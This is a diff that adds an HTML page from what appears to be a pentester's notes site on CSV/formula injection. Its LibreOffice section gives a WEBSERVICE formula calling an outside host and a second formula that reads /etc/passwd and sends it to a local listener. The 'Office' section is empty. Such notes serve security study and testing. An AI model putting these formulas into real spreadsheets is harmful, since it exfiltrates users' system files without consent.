@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>CSV Injection - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Payloads", url: "#_top", children: [
+          ]},
+          {title: "Libreoffice / Linux", url: "#libreoffice-linux", children: [
+          ]},
+          {title: "Office", url: "#office", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../cross_site_web_socket_hijack/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../cross_site_web_socket_hijack/" class="btn btn-xs btn-link">
+        Cross-Site Web Socket Hijack (CSHSH)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../cache_poisoning/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../cache_poisoning/" class="btn btn-xs btn-link">
+        Cache Poisoning
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="payloads">Payloads<a class="headerlink" href="#payloads" title="Permanent link">#</a></h2>
+<h2 id="libreoffice-linux">Libreoffice / Linux<a class="headerlink" href="#libreoffice-linux" title="Permanent link">#</a></h2>
+<p>In order to make a simple request through libreoffice Calc you can do this in a cell:</p>
+<pre><code>=WEBSERVICE(&quot;http://labburk.se&quot;)
+</code></pre>
+
+<p>To get this to execute on Libreoffice &gt; 6 is quite a hassle. First the user mst open the document and allow importing passwd file. Then the user must </p>
+<pre><code>=WEBSERVICE(CONCATENATE(&quot;http://localhost:8888/?AA&quot;, ('file:///etc/passwd'#$passwd.A1)))
+</code></pre>
+
+<p>Documented here:
+https://www.notsosecure.com/data-exfiltration-formula-injection/</p>
+<p>You can</p>
+<h2 id="office">Office<a class="headerlink" href="#office" title="Permanent link">#</a></h2>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../cross_site_web_socket_hijack/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../cross_site_web_socket_hijack/" class="btn btn-xs btn-link">
+        Cross-Site Web Socket Hijack (CSHSH)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../cache_poisoning/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../cache_poisoning/" class="btn btn-xs btn-link">
+        Cache Poisoning
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_web_applications/csv_injection.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
